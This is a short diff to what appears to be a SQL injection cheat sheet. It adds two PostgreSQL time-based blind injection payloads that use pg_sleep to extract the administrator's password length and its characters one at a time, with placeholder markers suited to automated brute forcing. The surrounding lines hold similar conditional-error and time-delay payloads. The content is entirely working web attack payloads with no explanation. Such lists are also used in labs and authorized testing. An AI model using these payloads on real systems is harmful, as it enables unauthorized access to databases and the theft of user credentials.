@@ -316,6 +316,10 @@ select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username=
 
 ' || (select case when (username='[username here]' and LENGTH(password)>n) then pg_sleep(10) else pg_sleep(-1) end from users)-- -
 
+x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>3) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+
+x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,$1$,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+
 ';select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end from users--
 ```
 
